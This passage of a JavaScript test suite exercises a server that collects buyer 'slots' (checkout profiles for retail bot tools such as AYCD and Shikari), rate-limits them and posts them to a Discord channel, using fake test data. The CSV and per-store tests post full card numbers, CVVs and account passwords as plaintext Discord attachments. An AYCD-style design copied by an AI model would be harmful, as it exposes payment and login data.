  await test("asking again while one is waiting doesn't post again", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 60 })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("the review page needs the right token and changes nothing by itself", async () => {
    assert.equal((await fetch(frankLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await slotPost(frankLink.replace(/t=[^&]+/, "t=nope"), "approve")).status, 404);
    const html = await (await fetch(frankLink)).text();
    assert.match(html, /asked for <strong>40<\/strong>/); assert.match(html, /Waiting for your decision/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 20);
  });
  await test("approving can grant a different number, and the channel message is updated", async () => {
    const res = await slotPost(frankLink, "approve", 35);
    assert.match(await res.text(), /can now use 35 slots/);
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 35); assert.equal(lim.request.status, "approved"); assert.equal(lim.request.granted, 35);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Approved: 35 slots/);
  });
  await test("an out-of-range amount is refused on the review page", async () => {
    assert.match(await (await slotPost(frankLink, "approve", 0)).text(), /between 1 and 500/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 35);
  });
  await test("denying after approving puts the limit back", async () => {
    await slotPost(frankLink, "deny");
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "denied");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Slot request denied/);
  });
  await test("a denied request can be approved later", async () => {
    await slotPost(frankLink, "approve");
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 40);
  });
  await test("a revoked key can't ask or read its limit", async () => {
    await admin("/admin/revoke", { key: frankKey });
    assert.equal((await slots("/slots/limit", frankKey)).status, 401);
    assert.equal((await slots("/slots/request", frankKey, { requested: 80 })).status, 401);
    await admin("/admin/restore", { key: frankKey });
  });
  await test("at most 3 requests a day per license", async () => {
    for (const n of [41, 42]){
      const r = await (await slots("/slots/request", frankKey, { requested: n })).json();
      assert.equal(r.status, "pending");
      const link = slotLink(await new Promise((ok) => setTimeout(() => ok(webhookPosts.at(-1).content), 300)));
      await slotPost(link, "deny");
    }
    assert.equal((await slots("/slots/request", frankKey, { requested: 43 })).status, 429);
  });
  await test("admin lists limits and requests with review links", async () => {
    const d = await (await admin("/admin/slots")).json();
    assert.equal(d.default, 20);
    assert.equal(d.limits.length, 1); assert.equal(d.limits[0].slot_limit, 40);
    assert.equal(d.requests.length, 3);
    assert.ok(d.requests.every((q) => q.review_url.includes("/slots/review/") && q.review_token === undefined && q.key_hash === undefined));
  });
  console.log("\nSubmissions");
  const b64u = (b) => Buffer.from(b).toString("base64url");
  const newCollectKey = async () => {
    const kp = await crypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
    const raw = new Uint8Array(await crypto.subtle.exportKey("raw", kp.publicKey));
    const h = new Uint8Array(await crypto.subtle.digest("SHA-256", raw));
    const hex = Buffer.from(h).toString("hex").toUpperCase();
    return { pub: b64u(raw), keyId: hex.slice(0, 4) + "-" + hex.slice(4, 8), fingerprint: hex.slice(0, 32).match(/.{4}/g).join(" ") };
  };
  const fakeCode = (n = 200) => "PVSUB1." + b64u(crypto.getRandomValues(new Uint8Array(65))) + "." + b64u(crypto.getRandomValues(new Uint8Array(12))) + "." + b64u(crypto.getRandomValues(new Uint8Array(n)));
  const keyLink = (content) => (content.match(/\((http[^)]+\/submit\/review\/[^)]+)\)/) || [])[1];
  const keyPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const ownerKey = await newCollectKey(), otherKey = await newCollectKey();
  let ownerLink;
  await test("there's no collecting key until the owner confirms one", async () => {
    assert.deepEqual(await getJson("/submit/key"), { pub: null, keyId: null });
    const r = await slots("/submissions", frankKey, { code: fakeCode(), keyId: ownerKey.keyId, slots: 1 });
    assert.equal(r.status, 409); assert.equal((await r.json()).error, "no collecting key");
  });
  await test("offering a key needs a license and a real P-256 key", async () => {
    assert.equal((await slots("/submit/key", null, { pub: ownerKey.pub })).status, 401);
    assert.equal((await slots("/submit/key", frankKey, { pub: "nope" })).status, 400);
    const bad = Buffer.from(ownerKey.pub, "base64url"); bad[64] ^= 1;   // no longer a point on the curve
    assert.equal((await slots("/submit/key", frankKey, { pub: b64u(bad) })).status, 400);
  });
  await test("an offer whose post failed is posted when the app offers it again", async () => {
    const k = await newCollectKey();
    webhookFail.push(500);
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    const before = webhookPosts.length;
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    await keyPost(keyLink(webhookPosts.at(-1).content), "deny");
  });
  await test("an offered key is posted to the channel with its key ID, and isn't used yet", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub, name: "Owner" })).json();
    assert.deepEqual(r, { status: "pending", keyId: ownerKey.keyId });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, new RegExp("with key " + ownerKey.keyId)); assert.match(m, /Only confirm if the key ID and fingerprint on the review page match your own FAFO/);
    ownerLink = keyLink(m); assert.ok(ownerLink);
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "pending");
    const again = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json();
    assert.equal(again.status, "pending");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before + 1, "not posted twice");
  });
  await test("the key review page needs its token and changes nothing by itself", async () => {
    assert.equal((await fetch(ownerLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await keyPost(ownerLink.replace(/t=[^&]+/, "t=nope"), "confirm")).status, 404);
    const html = await (await fetch(ownerLink)).text();
    assert.match(html, new RegExp(ownerKey.keyId)); assert.match(html, new RegExp(ownerKey.fingerprint)); assert.match(html, /Waiting for you/);
    assert.equal((await getJson("/submit/key")).pub, null);
  });
  await test("confirming makes it the key everyone's Orbit encrypts to", async () => {
    assert.match(await (await keyPost(ownerLink, "confirm")).text(), /Confirmed/);
    assert.deepEqual(await getJson("/submit/key"), { pub: ownerKey.pub, keyId: ownerKey.keyId, fingerprint: ownerKey.fingerprint });
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "active");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Submissions now arrive here/);
    assert.equal((await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json()).status, "active");
  });
  let code;
  await test("a submission is posted as an attachment, with only the sealed code in it", async () => {
    code = fakeCode(3000);
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, name: "Frank *F*", slots: 3, stores: [{ name: "Target", n: 2 }, { name: "Best_Buy", n: 1 }] });
    assert.equal(r.status, 200); assert.equal((await r.json()).ok, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\*\*3 slots\*\* from \*\*Frank \\\*F\\\*\*\* · @frank · license …/);
    assert.match(m.content, /Target 2 · Best\\_Buy 1/); assert.match(m.content, new RegExp("key " + ownerKey.keyId));
    assert.equal(m.files.length, 1); assert.equal(m.files[0].text, code);
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("submissions need a license, a sealed code and the current key", async () => {
    assert.equal((await slots("/submissions", null, { code, keyId: ownerKey.keyId, slots: 1 })).status, 401);
    assert.equal((await slots("/submissions", frankKey, { code: '{"cards":[]}', keyId: ownerKey.keyId, slots: 1 })).status, 400);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 0 })).status, 400);
    const r = await slots("/submissions", frankKey, { code, keyId: otherKey.keyId, slots: 1 });
    assert.equal(r.status, 409);
    assert.deepEqual(await r.json(), { error: "key changed", pub: ownerKey.pub, keyId: ownerKey.keyId });
  });
  await test("sending the same batch again (its answer got lost) doesn't post it twice", async () => {
    const batch = "batch" + rid();
    const before = webhookPosts.length;
    const first = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.deepEqual(first, { ok: true, id: batch, review: "pending" });
    const again = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true); assert.equal(again.review, "pending");
    assert.equal(webhookPosts.length, before + 1);
    assert.equal((await slots("/submissions", GH_KEY, { code, keyId: ownerKey.keyId, slots: 2, batch })).status, 409, "another license can't reuse it");
  });
  await test("if the channel refuses the post, the app is told", async () => {
    webhookFail.push(500);
    const batch = "failing" + rid();
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 502);
    const before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 200, "and trying again posts it");
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a new key replaces the old one once confirmed", async () => {
    await slots("/submit/key", frankKey, { pub: otherKey.pub });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = keyLink(webhookPosts.at(-1).content);
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "old key stays until confirmed");
    await keyPost(link, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, otherKey.keyId);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "replaced");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.ok(webhookEdits.some((e) => /replaced by a newer one/.test(e.content)));
    await keyPost(ownerLink, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "the owner can switch back");
  });
  await test("stopping the key stops submissions", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1 })).status, 409);
    await keyPost(ownerLink, "confirm");
  });
  await test("at most 30 submissions an hour per license", async () => {
    const small = fakeCode();
    for (let i = 0; i < 29; i++) assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 429);
  });
  await test("admin lists keys (with review links) and submissions, never the codes", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.keys.length, 3);
    assert.ok(d.keys.every((k) => k.review_url.includes("/submit/review/") && k.review_token === undefined && k.key_hash === undefined));
    assert.equal(d.submissions.length, 33);
    assert.ok(d.submissions.every((x) => x.code === undefined && x.bytes > 0));
  });

  console.log("\nPulls");
  const pull = (key, body) => slots("/pull", key, body);
  const sentOn = Date.parse("2026-09-26T15:00:00Z");
  const two = [
    { store: "Target", profile: "Kim   Lee", email: "kim_lee@example.com", card: "Visa 4242", sentAt: sentOn },
    { store: "Best Buy", profile: "Sam\nPark", email: "", card: "Amex 1005", sentAt: sentOn - 86400000 },
  ];
  let pullBatch;
  await test("pulls need a license", async () => {
    assert.equal((await pull(null, { keyId: ownerKey.keyId, slots: two })).status, 401);
    const r = await pull("PVLT-AAAA-BBBB-CCCC-DDDD", { keyId: ownerKey.keyId, slots: two });
    assert.equal(r.status, 401); assert.deepEqual(await r.json(), { error: "license not recognized" });
  });
  await test("a pull for a key this license never sent slots to isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: otherKey.keyId, name: "Frank", slots: two })).json(), { ok: true, forwarded: false });
    assert.deepEqual(await (await pull(frankKey, { keyId: "ABCD-1234", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("pulling sent slots posts them to the channel as a plain list", async () => {
    pullBatch = "pull" + rid();
    const before = webhookPosts.length;
    const r = await pull(frankKey, { keyId: ownerKey.keyId.toLowerCase(), name: "Frank *F*", batch: pullBatch, slots: two });
    assert.equal(r.status, 200);
    assert.deepEqual(await r.json(), { ok: true, forwarded: true, id: pullBatch });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`🔻 **2 slots pulled** by **Frank \\*F\\*** · @frank · license …${frankKey.slice(-4)}\n`), m.content);
    assert.ok(m.content.includes("\nTarget · Kim Lee · kim\\_lee@example.com · Visa 4242 · sent 2026-09-26\n"), "email is markdown-escaped");
    assert.ok(m.content.includes("\nBest Buy · Sam Park · Amex 1005 · sent 2026-09-25\n"), "empty parts are left out");
    assert.ok(m.content.endsWith(`\n-# Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.equal(m.files.length, 0); assert.equal(m.flags, 4); assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same pull again (its answer got lost) doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await pull(frankKey, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.deepEqual(await again.json(), { ok: true, forwarded: true, duplicate: true, id: pullBatch });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("another license can't reuse a pull's batch id", async () => {
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "batch id taken" });
  });
  await test("one slot pulled", async () => {
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, slots: [{ store: "Walmart", profile: "Solo", sentAt: "yesterday" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts.at(-1).content;
    assert.ok(m.startsWith(`🔻 **1 slot pulled** by @frank · license …${frankKey.slice(-4)}\n`), m);
    assert.ok(m.includes("\nWalmart · Solo\n"), "a sentAt that isn't a time is left off");
    assert.match(m, /Take it off their list\./);
  });
  await test("pulls need a key ID and at least one slot with a store or profile", async () => {
    for (const body of [
      { keyId: ownerKey.keyId, slots: [] },
      { keyId: ownerKey.keyId },
      { keyId: ownerKey.keyId, slots: [{ email: "a@b.c", card: "Visa 1111" }, null, "x"] },
      { keyId: ownerKey.keyId, slots: Array.from({ length: 501 }, () => ({ store: "Target" })) },
      { keyId: "nope", slots: two },
      { keyId: ownerKey.keyId + "0", slots: two },
      { slots: two },
    ]) assert.equal((await pull(frankKey, body)).status, 400, JSON.stringify(body).slice(0, 80));
    assert.equal((await pull(frankKey, { keyId: ownerKey.keyId, slots: two, pad: "x".repeat(210000) })).status, 413);
  });
  await test("a long pull is attached as a file, with counts per store in the message", async () => {
    const many = Array.from({ length: 60 }, (_, i) => ({
      store: i % 2 ? "Walmart" : "Target", profile: `Profile ${i} ` + "with a very long name ".repeat(5),
      email: `shopper_${i}@example.com`, card: "Mastercard 5454", sentAt: sentOn,
    }));
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, name: "Frank *F*", slots: many })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.length <= 2000, "fits in one Discord message: " + m.content.length);
    assert.match(m.content, /^🔻 \*\*60 slots pulled\*\* by \*\*Frank/);
    assert.match(m.content, /\nTarget 30 · Walmart 30\n/);
    assert.ok(m.content.endsWith(`\n-# The full list is attached. Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.doesNotMatch(m.content, /Profile 0/, "the list itself is only in the file");
    assert.equal(m.files.length, 1);
    assert.match(m.files[0].name, /^orbit-pulled-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    const clip = (s, n) => s.replace(/\s+/g, " ").trim().slice(0, n);
    assert.deepEqual(m.files[0].text.trim().split("\n"),
      many.map((x) => `${x.store} | ${clip(x.profile, 80)} | ${x.email} | Mastercard 5454 | sent 2026-09-26`), "every slot, not markdown-escaped");
  });
  await test("if the channel refuses a pull, the app is told and sending it again posts it", async () => {
    webhookFail.push(500);
    const batch = "pullfail" + rid();
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 502); assert.deepEqual(await r.json(), { error: "couldn't post to the channel" });
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still posts when the app hangs up mid-post, and its retry isn't posted again", async () => {
    const batch = "pullhang" + rid(), before = webhookPosts.length;
    webhookHang = { ms: 1500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    await new Promise((ok) => setTimeout(ok, 2500));
    assert.equal(webhookPosts.length, before + 1, "posted after the app hung up");
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still unposted after PULL_STALE_MS is taken over by a retry, and the first attempt failing late doesn't undo it", async () => {
    // The first attempt's post hangs for 6 s and then fails; the app gave up on it long before.
    const batch = "stuck" + rid(), before = webhookPosts.length, t0 = Date.now();
    webhookHang = { ms: 6000, code: 500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 425, "a recent attempt may still be posting"); assert.deepEqual(await r.json(), { error: "still sending" });
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 3600 - Date.now())));
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 7500 - Date.now())));   // the first attempt has failed by now
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("at most 30 pulls an hour per license", async () => {
    const one = [{ store: "Target", profile: "Kim" }];
    for (let i = 0; i < 30; i++) assert.equal((await (await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true);
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one });
    assert.equal(r.status, 429); assert.deepEqual(await r.json(), { error: "too many pulls this hour" });
    assert.equal((await (await pull(frankKey, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true, "other licenses can still pull");
  });
  await test("admin lists pulls, without what was in them", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.pulls.length, 37);
    assert.deepEqual(Object.keys(d.pulls[0]).sort(), ["created_at", "id", "key_id", "key_last4", "name", "slots", "username"]);
    const p = d.pulls.find((x) => x.id === pullBatch);
    assert.deepEqual([p.slots, p.name, p.username, p.key_id], [2, "Frank *F*", "frank", ownerKey.keyId]);
  });

  console.log("\nCSV submissions (app 1.9.52+)");
  const csv = "profile_name,group,email,card_number,card_cvv,target_account_email,target_account_password\r\n" +
    'Kim Lee,Beta,kim@example.com,4242424242424242,123,kim.target@example.com,"pa,ss""word"\r\n' +
    "Sam Park,Main,sam@example.com,5454545454545454,456,,\r\n";
  let csvBatch;
  await test("a CSV batch is posted as a .csv file, and needs no collecting key", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    csvBatch = "csv" + rid();
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, stores: [{ name: "Target", n: 2 }], batch: csvBatch });
    assert.equal(r.status, 200); assert.deepEqual(await r.json(), { ok: true, id: csvBatch, review: "pending" });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **2 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 2\n`), m.content);
    assert.match(m.content, new RegExp(`\\n-# CSV attached\\.\\n⏳ \\*\\*Pending your approval\\*\\* · \\[Approve or decline\\]\\(${BASE}/submissions/review/${csvBatch}\\?t=[A-Za-z0-9_-]{32}\\)$`), m.content);
    assert.equal(m.files.length, 1); assert.deepEqual(asShown(m.files[0].text), csvRows(csv), "the CSV as sent, as Excel shows it");
    assert.equal(m.files[0].text.split("\r\n")[1], 'Kim Lee,Beta,kim@example.com,"=""4242424242424242""","=""123""",kim.target@example.com,"pa,ss""word"', "card number and CVV as Excel text");
    assert.ok(m.files[0].text.endsWith("\r\n"), "ends as it did");
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Beta\.csv$/);
    assert.match(m.files[0].type, /^text\/csv/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same CSV batch again doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await (await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, batch: csvBatch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true);
    assert.equal(webhookPosts.length, before);
  });
  await test("a CSV batch needs a license, Orbit's CSV header and a slot count, and has a size limit", async () => {
    assert.equal((await slots("/submissions", null, { csv, slots: 2 })).status, 401);
    for (const body of [
      { csv: "", slots: 1 },
      { csv: "name,email\r\nKim,kim@example.com\r\n", slots: 1 },
      { csv: "\r\n" + csv, slots: 1 },
      { csv, slots: 0 },
      { csv: 42, slots: 1 },
    ]) assert.equal((await slots("/submissions", frankKey, body)).status, 400, JSON.stringify(body).slice(0, 60));
    assert.equal((await slots("/submissions", frankKey, { csv: "\uFEFF" + csv, slots: 2 })).status, 200, "a byte-order mark is fine");
    assert.equal((await slots("/submissions", frankKey, { csv: csv + "x".repeat(4_050_000), slots: 2 })).status, 413);
  });
  await test("pulling slots that were sent as CSV posts them, and says so", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: "csv", name: "Beta", slots: two })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    assert.ok(webhookPosts.at(-1).content.endsWith("\n-# Take them off their list. Sent as CSV."), webhookPosts.at(-1).content);
    assert.doesNotMatch(webhookPosts.at(-1).content, /4242424242424242/, "never the card number");
  });
  await test("a CSV pull from a license that never sent a CSV batch isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(GH_KEY, { keyId: "CSV", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("admin lists CSV batches as key CSV, never the CSV itself", async () => {
    const d = await (await admin("/admin/submissions")).json();
    const s = d.submissions.find((x) => x.id === csvBatch);
    assert.equal(s.key_id, "CSV"); assert.equal(s.slots, 2); assert.equal(s.bytes, csv.length);
    assert.ok(d.submissions.every((x) => x.csv === undefined && x.code === undefined));
  });
  await test("slots asking the owner to assign an account are counted on their store's line (app 1.9.53+)", async () => {
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 9, stores: [
      { name: "Target", n: 3, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Best Buy", n: 1, seller: 0 },
      { name: "Costco", n: 2, seller: 9 }, { name: "Nike", n: 1, seller: -3 }, { name: "Topps", n: 1, seller: "x" }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content,
      /\nTarget 3 \(2 need an account\) · Walmart 1 \(1 needs an account\) · Best Buy 1 · Costco 2 \(2 need an account\) · Nike 1 · Topps 1\n/,
      "counted, capped at the store's slots, and left off when there are none or it isn't a number");
  });
  console.log("\nPer-store files (app 1.9.53+)");
  const tgtCsv = "profile_name,first_name,last_name,email,phone_num,cc_number,cc_exp_month,cc_exp_year,cc_cvv,shipping_street,shipping_street_2,shipping_city,shipping_state,shipping_zip_code,shipping_country,billing_first_name,billing_last_name,billing_street,billing_street_2,billing_city,billing_state,billing_zip_code,billing_country\r\n" +
    "Kim Lee,Kim,Lee,kim@example.com,5550100,4242424242424242,07,2029,123,1 Main St,,Austin,TX,78701,US,Kim,Lee,1 Main St,,Austin,TX,78701,US";
  const wmCsv = tgtCsv.replace("Kim Lee,Kim,Lee", "Sam Park,Sam,Park");
  // The same row as Shikari writes it: the month without its leading 0, CRLF after every line (2026-10-09).
  const kimShikari = tgtCsv.split("\r\n")[0] + "\r\nKim Lee,Kim,Lee,kim@example.com,5550100,4242424242424242,7,2029,123,1 Main St,,Austin,TX,78701,US,Kim,Lee,1 Main St,,Austin,TX,78701,US\r\n";
  await test("a batch comes as an AYCD list and a Shikari CSV per store, with its logins in a .txt, named by buyer and store (2026-10-09)", async () => {
    const before = webhookPosts.length;
    const files = [
      { store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", kind: "profiles", text: wmCsv }, { store: "Pokémon Center", kind: "profiles", text: tgtCsv }];
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 3, batch: "files" + rid(),
      stores: [{ name: "Target", n: 1 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1 }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1, "one message");
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **3 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 1 · Walmart 1 (1 needs an account) · Pokémon Center 1\n`), m.content);
    assert.ok(m.content.includes("\n-# Per store: its profiles for AYCD (.json) and Shikari (.csv), with its logins (email:password, .txt) in the same order (none for Pokémon Center). Profiles that need an account come last.\n⏳ **Pending your approval** · [Approve or decline]("), m.content);
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt",
      "Beta-walmart-aycd.json", "Beta-walmart-shikari.csv", "Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"]);
    assert.deepEqual(shikariOf(m).map((f) => f.text), [kimShikari, kimShikari.replace("Kim Lee,Kim,Lee", "Sam Park,Sam,Park"), kimShikari], "each store's rows as Shikari writes them");
    assert.ok(shikariOf(m).every((f) => /^text\/csv/.test(f.type)), "as CSV files");
    assert.deepEqual(aycdOf(m).map((l) => l.map((x) => x.name)), [["Kim Lee"], ["Sam Park"], ["Kim Lee"]], "each store's rows as AYCD profiles");
    assert.deepEqual(plain(m).map((f) => f.text), [files[1].text], "the logins file exactly as sent");
    assert.match(plain(m)[0].type, /^text\/plain/); assert.match(m.files[0].type, /^application\/json/);
  });
  await test("Pokémon Center's slots go out as their AYCD list and Shikari CSV, never a logins file (2026-10-07)", async () => {
    // An older app (no storeKey) or older data can still send one; the email is on each AYCD profile.
    for (const pc of [{ store: "Pokémon Center", storeKey: "pokemoncenter" }, { store: "Pokemon Center" }]) {
      const before = webhookPosts.length;
      const files = [
        { store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
        { ...pc, kind: "profiles", text: wmCsv }, { store: pc.store, kind: "logins", text: "sam.pc@example.com:Inbox-Pw-9!" }];
      assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 2, batch: "pcl" + rid(), stores: [{ name: "Target", n: 1 }, { name: pc.store, n: 1 }] })).status, 200);
      const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
      assert.deepEqual(m.files.map((f) => f.name),
        ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt", "Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"], pc.store);
      assert.ok(!m.files.some((f) => /Inbox-Pw-9/.test(f.text)), "its password goes nowhere");
      assert.ok(m.content.includes("with its logins (email:password, .txt) in the same order (none for Pokémon Center)."), m.content);
    }
    // A batch of only Pokémon Center: no logins file, and the message doesn't mention one.
    const before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Pokémon Center", storeKey: "pokemoncenter", kind: "profiles", text: wmCsv },
      { store: "Pokémon Center", kind: "logins", text: "sam.pc@example.com:Inbox-Pw-9!" }], name: "Beta", slots: 1, batch: "pcl" + rid(), stores: [{ name: "Pokémon Center", n: 1 }] })).status, 200);
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"]);
